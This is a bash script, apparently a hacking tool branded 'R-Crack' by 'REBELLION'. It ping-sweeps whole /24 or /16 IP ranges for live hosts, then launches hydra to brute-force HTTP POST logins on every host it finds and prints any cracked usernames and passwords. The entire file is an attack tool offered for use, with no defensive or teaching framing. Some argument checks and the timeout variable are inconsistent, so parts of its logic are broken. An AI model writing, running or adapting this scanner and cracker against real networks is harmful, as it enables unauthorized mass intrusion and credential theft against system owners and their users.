#!/bin/bash
if [[ $1 == "" ]] || [[ $1 == "-h" ]] || [[ $1 == "--help" ]] || [[ $7 == "" ]] ; then
	echo "usage. bash $0 <RANGE> <WIDE> <-u / -U> <USERNAME / USER_LIST> <-p / -P> <PASSWORD / PASS_LIST> <BRUTEFORCE TIME/sec>"
	echo "eg. bash $0 197.41.181.1/24 all -u user -p user 50"
	echo "eg. bash $0 199.60.1.1/16 5 -u user -P password_list.txt 200 "
        echo "eg. ./$0 199.60.1.1/16 10 -U usernames_list -p password 500 "
	exit 2
fi

normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'
white='\e[97m'
echo -e "$yellow"
echo "__________           _________                       __    "
echo -e "\______   \          \_   ___ \____________    ____ |  | __"
echo -e " |       _/ ${blue}  ______${yellow} /    \  \/\_  __ \__  \ _/ ___\|  |/ /"
echo -e " |    |   \ ${blue} /_____/${yellow} \     \____|  | \// __ \\  \___|    < "
echo ' |____|_  /           \______  /|__|  (____  /\___  >__|_ \'
echo '        \/                   \/            \/     \/     \/'
echo -e "	      ${red}CODED BY REBELLION ${yellow}-${red} @${blue}rebellionil		"
trap " echo "" ; echo '[X] EXIT !' ; kill $( pgrep  hydra ) 2> /dev/null ; kill $( pgrep ping ) 2> /dev/null ; cd .. ; rm -rf .workspace ; exit " SIGINT SIGTERM
if [[ -d .workspace ]] ; then
   rm -rf .workspace
fi
mkdir .workspace
cd .workspace

IP1=$( echo $1 | sed 's/\/16//g' | cut -d '.' -f1,2 )
IP2=$( echo $1 | sed 's/\/16//g' | cut -d '.' -f1,2,3 )

if [[ $2 == "all" ]] ; then
   if [[ $1 =~ "/24" ]] ;then
      for i in {1..254} ; do
         if [[ $( ping -c 1 -s 10 $IP2.$i ) =~ "ttl=" ]] ; then
            echo "$IP2.$i" >> ips.txt
         fi &
      done
   elif [[ $1 =~ "/16" ]] ; then
   time=1
      for v in $( seq 1 254 ) ; do
         echo $IP1.$v >> v.txt
      done
      for i in $( cat v.txt ) ; do
         for j in $( seq 1 254 ) ; do
            if [[ $( ping -c 1 -s 10 $i.$j ) =~ "ttl=" ]] ; then
               echo "$i.$j" >> ips.txt
            fi &
            if [[ $time == 100 ]] ; then
               time=1
               wait
            fi
            let time+=1
         done
      done
   fi
else
   if [[ $1 =~ "/24" ]] ; then
      for i in $( seq 1 254 ) ; do
          if [[ $( ping -c 1 -s 10 $IP2.$i ) =~ "ttl=" ]] ; then
              echo "$IP2.$i" >> ips.txt
          fi &
       done
   elif [[ $1 =~ "/16" ]] ; then
      time=1
      for v in $( seq 1 $2 ) ; do
         echo $IP1.$v >> v.txt
      done
      for i in $( cat v.txt ) ; do
         for j in $( seq 1 254 ) ; do
            if [[ $( ping -c 1 -s 10 $i.$j ) =~ "ttl=" ]] ; then
               echo "$i.$j" >> ips.txt
            fi &
            if [[ $time == 100 ]] ; then
               time=1
               wait
            fi
            let time+=1
         done
      done
   fi
fi
echo -e "${green}[+]${purp} IPs list $white"
x=1
for i in $(cat ips.txt ) ; do
   let x=$x+1
   echo -e "${red}[+] ${white}$i " ; done
echo ""
echo -e "${yellow}[+]${green} Bruteforcing $normal"

if [[ $3 == "-u" ]] && [[ $5 == "-p" ]] ; then
   hydra -q -l $4 -p $6 -M ips.txt http-post / 1> found.txt 2> /dev/null &
elif [[ $4 == "-U" ]] && [[ $6 == "-P" ]] ; then
   hydra -q -L $5 -P $7 -M ips.txt http-post / 1> found.txt 2> /dev/null &
elif [[ $4 == "-u" ]] && [[ $6 == "-P" ]] ; then
   hydra -q -l $5 -P $7 -M ips.txt http-post / 1> found.txt 2> /dev/null &
elif [[ $4 == "-U" ]] && [[ $6 == "-p" ]] ; then
   hydra -q -L $5 -p $7 -M ips.txt http-post / 1> found.txt 2> /dev/null &
fi

sleep $7
kill `pgrep hydra`
cat found.txt | grep '[80]' | awk {' print "[:] " $3 " " $4" "$5 " " $6" "$7 '} | column -t -s ' ' | grep --color  -e "login" -e "password"
echo ""
